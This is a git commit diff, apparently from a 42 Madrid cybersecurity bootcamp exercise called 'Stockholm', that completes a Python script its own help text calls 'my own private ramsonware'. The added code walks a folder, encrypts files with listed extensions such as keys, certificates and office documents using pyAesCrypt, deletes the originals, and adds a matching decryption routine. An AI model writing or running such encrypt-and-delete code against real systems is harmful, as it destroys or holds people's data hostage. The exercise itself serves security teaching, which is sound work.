57f4ab92a922b897ee7b1539e5ef1676f0c7a76d
Fernando Ballesteros santamaria <fballest@c1r17s3.42madrid.com>
2023-05-17 14:06:49 +0200

    Stockholm solved

--- stockholm/stockholm.py
+++ stockholm/stockholm.py
@@ -26,7 +26,8 @@ extensions = ('.der', '.pfx', '.key', '.crt', '.csr', '.p12', '.pem', '.odt', '.
               '.dotx', '.dotm', '.dot', '.docm', '.docb', '.docx', '.doc')
 
 def get_files_list():
-    path = "/home/infection"
+    # path = "/home/infection"
+    path = "/Users/fballest/42/otros_cursos/doing/cyber_bootcamp/stockholm/infection"
     file_list = []
     if not os.path.exists(path):
         print("Error: path do not exits.\n")
@@ -37,17 +38,36 @@ def get_files_list():
                 file_list.append(file[0] + "/" + f)
     return(file_list)
 
+def get_files_ft():
+    # path = "/home/infection"
+    path = "/Users/fballest/42/otros_cursos/doing/cyber_bootcamp/stockholm/infection"
+    files_ft = []
+    files = os.walk(path)
+    for file in files:
+        for f in file[2]:
+            if f.endswith(".ft"):
+                files_ft.append(file[0] + "/" + f)
+    return (files_ft)
+
 def encryptFiles(silent, key):
     files = get_files_list()
     for file in files:
-        if (silent == True):
-            print("Encrypting file", file, "to a new file", file + ".ft")
+        if (silent == False):
+            print("Encrypting file", file, "to a new encrypted file", file + ".ft")
         pyAesCrypt.encryptFile(file, file + ".ft", key)
+        os.remove(file)
     
 
 def decryptFiles(silent, key):
     files = get_files_ft()
-    print(files)
+    for file in files:
+        if (silent == False):
+            print("Decrypting file", file, "to a new decrypted file", (file.rstrip("ft")).rstrip('.'))
+        try:
+            pyAesCrypt.decryptFile(file, (file.rstrip("ft")).rstrip('.'), key)
+            os.remove(file)
+        except:
+            continue
 
 if __name__ == '__main__':
     parser = argparse.ArgumentParser(description='My own private ramsonware.', add_help=False)
@@ -67,6 +87,8 @@ if __name__ == '__main__':
                 h.write(html_string)
             this_directory = Path(__file__).parent
             webbrowser.open_new("file://"+str(this_directory)+"/"+"README.html")
+            input("press a key to continue.....")
+            os.remove(str(this_directory)+"/"+'README.html') 
         except:
             print(markdown_string)
         exit
@@ -74,10 +96,10 @@ if __name__ == '__main__':
         print("Stockholm ramsonware version 1.0.0")
         exit
     elif (args.reverse == False and len(args.key) >= 16):
-        encryptFiles(False, args.key)
+        encryptFiles(args.silent, args.key)
         exit
     elif (args.reverse == True and len(args.key) >= 16):
-        decryptFiles(True, args.key)
+        decryptFiles(args.silent, args.key)
         exit
     elif (len(args.key) < 16):
         print("Your key must have at least 16 characters")
